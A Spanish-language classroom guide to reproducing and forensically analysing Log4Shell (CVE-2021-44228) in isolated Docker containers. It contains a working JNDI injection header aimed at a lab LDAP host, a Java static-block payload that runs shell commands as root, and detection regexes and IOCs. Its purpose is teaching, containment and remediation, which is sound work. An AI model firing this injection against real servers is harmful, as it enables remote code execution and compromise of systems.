# Forense de Log4Shell desde la shell · guía para explicar en clase

Reproduce el ataque y lee la evidencia paso a paso. Todo corre en contenedores
(red `internal: true`, sin salida a internet). Desde el **host** (tu Mac / Ubuntu):

```bash
cd ~/desarrollo-seguro-ucp/seclab/labs/01-log4shell
docker compose up -d --build        # levanta victima + LDAP + HTTP del atacante
```

> Atajo: `make demo LAB=01-log4shell` hace ataque + evidencia + down en un comando.
> Esta guía es la versión **lenta**, para enseñar cada eslabón.

---

## 0 · La idea en una frase
Log4j 2.14.1, al **registrar un texto**, interpreta `${jndi:ldap://...}` como una
orden para **ir a buscar y ejecutar** una clase Java remota. Basta con que el texto
atacante llegue a un `log.info(...)` — aquí, por una cabecera HTTP.

```
cabecera HTTP  →  log.info()  →  lookup JNDI  →  LDAP atacante  →  descarga .class  →  RCE
```

---

## 1 · Estado limpio (antes del ataque)
```bash
docker compose exec victim ls -la /tmp/pwned.txt
#  -> "No such file or directory"   (no hay evidencia todavia)
```
**Qué enseña:** la máquina está sana. Lo que aparezca después lo creó el ataque.

## 2 · La dependencia vulnerable (el "paciente cero")
```bash
docker compose exec victim sh -c \
  'unzip -p $(find / -name "vuln*.jar"|head -1) \
   META-INF/maven/*/log4j-core/pom.properties 2>/dev/null | grep version'
#  -> version=2.14.1     (la version con el agujero)
```
**Qué enseña:** la falla no está en *tu* código, está en una **dependencia**. Por eso
el SBOM y el SCA (la fase de escaneo del curso) la cazan sin ejecutar nada.

## 3 · El disparo (el ataque, una sola cabecera)
```bash
docker compose run --rm trigger -s -o /dev/null -w "HTTP %{http_code}\n" \
  -H 'X-Api-Version: ${jndi:ldap://attacker-ldap:1389/Exploit}' http://victim:8080/
#  -> HTTP 200   (la app respondio normal... y ya fue comprometida)
```
**Qué enseña:** el atacante no toca la base de datos ni el login. Solo manda un
**header**. La app lo registra en un log y ahí empieza todo.

## 4 · La evidencia del RCE
```bash
docker compose exec victim cat /tmp/pwned.txt
```
```
=== RCE via Log4Shell (CVE-2021-44228) ===
uid=0(root) gid=0(root) groups=0(root),...
75d13db81bbb                 <- hostname del contenedor victima
Sat Nov 21 13:42:49 UTC 2026
```
**Qué enseña:** se ejecutó código arbitrario **como `root`** dentro de la víctima.
Ese `id` lo corrió el atacante, no tú.

---

## 5 · La autopsia · seguir la cadena en los logs

### 5a · Log de la víctima: el lookup JNDI que disparó todo
```bash
docker compose logs victim | grep -iE "Exploit|jndi|ldap|ClassCast"
```
```
l4s-victim | [Exploit] payload ejecutado en la victima
l4s-victim | ... WARN Error looking up JNDI resource [ldap://attacker-ldap:1389/Exploit].
l4s-victim | ... java.lang.ClassCastException: Exploit cannot be cast to ...ObjectFactory
```
**Qué enseña:** dos cosas clave para el forense:
- `[Exploit] payload ejecutado` → **el código del atacante corrió**.
- El `ClassCastException` es **NORMAL y esperado**: el payload ya hizo su daño en el
  bloque `static{}` *antes* de que Java intentara (y fallara) usar la clase como se
  esperaba. Ver el error en los logs NO significa que el ataque falló — significa
  que ya pasó. Muchos lo malinterpretan.

### 5b · Log del LDAP atacante: el "redirígete aquí"
```bash
docker compose logs attacker-ldap | grep -i "Send LDAP"
```
```
l4s-ldap | Send LDAP reference result for Exploit redirecting to http://attacker-http:8888/Exploit.class
```
**Qué enseña:** el servidor LDAP no devuelve datos: devuelve un **referido** que le
dice a la víctima "la clase que buscas está en este HTTP". Es el salto JNDI→HTTP.

### 5c · Log del HTTP atacante: la víctima fue a buscar el payload
```bash
docker compose logs attacker-http | grep Exploit
```
```
l4s-http | 172.28.0.2 - - [...] "GET /Exploit.class HTTP/1.1" 200 -
```
**Qué enseña:** la **propia víctima** descargó el `.class` malicioso (IP del
contenedor víctima). El atacante solo tuvo que servir un archivo.

### 5d · Qué hace el payload (el código que corrió en la víctima)
```bash
sed -n '/static/,/}/p' attacker-http/Exploit.java
```
```java
static {                         // corre al CARGAR la clase, antes del cast
    String[] cmd = {"/bin/sh","-c",
       "echo '... RCE ...' > /tmp/pwned.txt; id >> ...; hostname >> ...; date >> ..."};
    Runtime.getRuntime().exec(cmd);   // <- aqui ejecuta el comando en la victima
}
```
**Qué enseña:** el truco es el bloque `static{}`: Java lo ejecuta al **cargar** la
clase, así que corre aunque después el `cast` falle. En un ataque real, ese comando
sería `curl ...|sh`, un reverse shell o un minero. Aquí solo escribe un archivo.

---

## 6 · La contención (la defensa del lab)
```bash
docker compose exec victim wget -T 5 -q -O- http://1.1.1.1
#  -> "Network unreachable"     (la red es internal: true, sin gateway)
```
**Qué enseña:** aunque hubo RCE, la víctima **no puede salir a internet**: no
exfiltra, no descarga segunda etapa. Segmentación / egress mínimo = contención.
En producción, limitar la salida de red reduce muchísimo el impacto post-explotación.

## 7 · La corrección (por qué un SBOM lo vuelve trivial)
La pregunta de diciembre de 2021 fue *"¿dónde usamos log4j?"*. Con inventario:
```bash
cd ~/desarrollo-seguro-ucp/seclab/labs/01-log4shell
./demo-log4shell.sh      # SBOM (CycloneDX) + cruce con CVEs + fix a 2.17.1
```
Sin SBOM, responder eso tomó **semanas** en muchas empresas. Con SBOM, es un `grep`.
El fix real: actualizar a 2.17.x (o 2.16+ con `formatMsgNoLookups`, o quitar la clase JndiLookup).

## 8 · Cerrar y limpiar
```bash
docker compose down -v        # borra contenedores y la red del lab
docker compose ps             # vacio
```

---

## Mapa mental para la pizarra
```
  ATACANTE                           VICTIMA (log4j 2.14.1)
  --------                           ----------------------
  curl -H "X-Api-Version:            1) log.info("... {}", header)
     ${jndi:ldap://.../Exploit}"     2) ve ${jndi:...} -> hace lookup
          |                               |
          v                               v
  LDAP :1389  --referral-->        3) pregunta al LDAP por "Exploit"
  HTTP :8888  --Exploit.class-->    4) descarga la clase del HTTP atacante
                                    5) la CARGA -> static{} ejecuta /bin/sh
                                    6) RCE como root  (/tmp/pwned.txt)
```
La causa raíz: **datos no confiables** (una cabecera) tratados como **instrucción**
(una búsqueda+carga de código). El mismo patrón que la inyección en LLM de la sesión 5.

---

## Cierre DFIR · de "confirmé el RCE" a "reconstruí el incidente"

Tras confirmar la evidencia (pasos 4-5), un forense reconstruye el incidente completo:

```bash
# 6 · LINEA DE TIEMPO (cuando) — artefacto y log deben coincidir al segundo
docker compose exec victim stat -c '%n creado: %y' /tmp/pwned.txt
docker compose logs -t victim | grep "payload ejecutado"
#   OJO: los logs son acumulativos; correlaciona por timestamp.

# 7 · PROCESO Y PRIVILEGIO (con que permisos) — hallazgo: corria como root
docker compose exec victim ps -o pid,user,args | grep java
#   -> PID 1 root java -jar /app/vulnapp.jar   => el RCE fue root por esto.

# 8 · VECTOR DE ENTRADA (por donde) — la cadena jndi en los logs de la app
docker compose logs victim | grep -iE "jndi|ldap://"
#   en real: cruzar con el access log para IP y peticion del atacante.

# 9 · CAUSA RAIZ (por que) — una dependencia, no tu codigo
#     log4j-core 2.14.1 -> CVE-2021-44228

# 12 · DETECCION en logs reales (lo que buscaria un SIEM)
docker compose logs victim | grep -iE '\$\{jndi:(ldap|rmi|dns)'
```

### IOCs (indicadores de compromiso) para barrer toda la flota
| Tipo | Indicador |
|---|---|
| Patron en logs | `${jndi:ldap://`, `${jndi:rmi://`, `${jndi:dns://`, ofuscaciones `${lower:j}ndi` |
| Archivo | `/tmp/pwned.txt` (en real: binarios raros en /tmp, /dev/shm) |
| Red saliente | conexiones a :1389 (LDAP) y :8888 (HTTP) desde la app |
| Dependencia | log4j-core 2.0-beta9 .. 2.14.1 |

### Veredicto
- Impacto: ejecucion de codigo **como root** en la victima.
- Contencion: red `internal: true` -> sin egress; no hubo exfiltracion ni 2a etapa.
- Remediacion: actualizar a log4j 2.17.x (ver `./demo-log4shell.sh`).
